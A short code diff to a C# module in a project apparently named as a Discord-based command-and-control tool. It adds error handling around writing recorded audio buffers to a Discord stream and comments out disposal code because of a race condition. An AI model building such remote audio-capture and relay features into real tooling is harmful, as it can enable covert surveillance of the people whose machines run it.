@@ -10,7 +10,15 @@ namespace DiscordC2.Common
         public static AudioOutStream discordStream;
 
         private static void sourceStream_DataAvailable(object sender, WaveInEventArgs e) {
-            discordStream.Write(e.Buffer, 0, e.BytesRecorded);
+            try 
+            {
+                discordStream.Write(e.Buffer, 0, e.BytesRecorded); // race condition here when attempting to dispose of discordStream
+            } 
+            catch 
+            {
+                Console.WriteLine("Error writing to discord stream");
+                return;
+            }
         }
         private static void sourceStream_RecordingStopped(object sender, StoppedEventArgs e) {
             sourceStream.Dispose();
@@ -35,10 +43,15 @@ namespace DiscordC2.Common
             if (sourceStream != null){
                 sourceStream.StopRecording();
             }
+            
+            // causes race condition
+            // if (discordStream != null)
+            // {
+            //     discordStream.Flush();
+            //     discordStream.Dispose();
+            // }
 
-            if (discordStream != null) {
-                discordStream.Dispose();
-            }
+            
                 
             return;
         }
